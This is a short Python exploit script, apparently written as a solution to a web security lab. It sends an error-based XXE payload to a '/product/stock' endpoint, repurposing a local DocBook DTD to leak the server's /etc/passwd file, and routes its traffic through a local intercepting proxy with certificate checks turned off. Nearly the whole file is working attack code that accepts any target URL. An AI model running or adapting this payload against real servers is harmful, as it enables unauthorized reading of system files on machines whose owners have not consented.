import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_etc_passwd_file(url, session):
    stock_url = url + "/product/stock"
    data_stock = '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"><!ENTITY % ISOamsa '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    '>%local_dtd;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'''
    response = session.post(
        stock_url,
        data=data_stock,
        verify=False,
        proxies=proxies
    )
    return response.text

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        session = requests.Session()
        print("[+] Starting XXE attack...")
        etc_passwd_file = get_etc_passwd_file(url, session)
        print(etc_passwd_file)
        print("[+] XXE Attack was successful.")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The XXE attack was not successful.")
        sys.exit(FAIL) 